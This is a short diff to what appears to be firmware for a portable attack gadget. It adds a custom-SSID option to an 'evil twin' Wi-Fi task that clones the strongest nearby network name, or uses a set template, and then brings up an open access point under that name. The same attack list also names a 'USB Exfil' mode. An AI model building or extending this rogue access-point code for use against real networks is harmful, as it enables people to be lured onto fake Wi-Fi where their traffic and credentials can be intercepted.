@@ -27,6 +27,7 @@
 static AttackType current_attack = ATTACK_NONE;
 static TaskHandle_t attack_task_handle = NULL;
 static volatile bool stop_requested = false;
+static char evil_twin_ssid[33] = {0}; // Custom SSID template
 
 // IR Object (YS-IRTM)
 static YsIrtm irDriver(PIN_YS_IR_RX, PIN_YS_IR_TX);
@@ -513,11 +514,19 @@ static void task_wifi_evil_twin(void *pvParameters) {
         return;
     }
     
-    // Clone the strongest network
-    String targetSSID = WiFi.SSID(0);
-    int targetChannel = WiFi.channel(0);
+    // Decide target
+    String targetSSID;
+    int targetChannel = 6;
     
-    Serial.printf("[EVIL TWIN] Cloning: %s on ch %d\n", targetSSID.c_str(), targetChannel);
+    if (evil_twin_ssid[0] != 0) {
+        targetSSID = String(evil_twin_ssid);
+        Serial.printf("[EVIL TWIN] Using template: %s (Channel 6)\n", targetSSID.c_str());
+    } else {
+        // Clone the strongest network
+        targetSSID = WiFi.SSID(0);
+        targetChannel = WiFi.channel(0);
+        Serial.printf("[EVIL TWIN] Cloning: %s on ch %d\n", targetSSID.c_str(), targetChannel);
+    }
     
     // Setup as AP with same SSID (open network)
     WiFi.mode(WIFI_MODE_APSTA);
@@ -1327,5 +1336,14 @@ const char *attacks_get_name(AttackType type) {
         case ATTACK_USB_EXFIL: return "USB Exfil";
 
         default: return "Unknown";
+    }
+}
+
+void attacks_set_evil_twin_ssid(const char* ssid) {
+    if (ssid) {
+        strncpy(evil_twin_ssid, ssid, 32);
+        evil_twin_ssid[32] = 0;
+    } else {
+        evil_twin_ssid[0] = 0;
     }
 }
